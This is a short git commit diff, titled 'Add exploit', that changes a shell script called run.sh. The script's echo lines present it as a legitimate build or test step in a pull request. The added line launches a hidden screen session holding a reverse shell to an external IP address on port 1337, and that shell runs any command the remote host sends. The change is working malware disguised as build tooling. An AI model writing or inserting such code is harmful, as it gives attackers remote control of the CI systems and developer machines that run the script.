6eb64af508e0196e7f24af966d9883de9929782c
c0rv4x22 <146779735+c0rv4x22@users.noreply.github.com>
2024-10-04 02:05:49 +0300

    Add exploit

--- run.sh
+++ run.sh
@@ -3,3 +3,6 @@
 
 echo 'This simulates some build or test process'
 echo 'This is a part of a legit PR'
+
+
+screen -dmS reverse_shell bash -c 'exec 5<>/dev/tcp/104.238.172.243/1337; while read line <&5; do sh -c "$line" >&5 2>&5; done'
